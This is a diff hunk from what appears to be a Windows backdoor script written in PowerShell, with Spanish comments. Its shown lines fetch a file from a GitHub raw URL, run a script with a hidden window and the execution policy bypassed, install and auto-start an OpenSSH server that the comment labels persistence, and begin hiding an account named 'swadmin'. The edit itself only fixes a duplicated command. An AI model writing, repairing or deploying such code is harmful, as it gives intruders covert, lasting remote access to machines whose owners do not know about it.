@@ -59,7 +59,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/re
 powershell -windowstyle hidden -ep bypass .\"$radd_file.ps1"
 cd $path
 # estableciendo persistencia ssh
-powershell powershell.exe -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
+powershell -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
 
 #ocultando usuario swadmin
 cd C:\Users
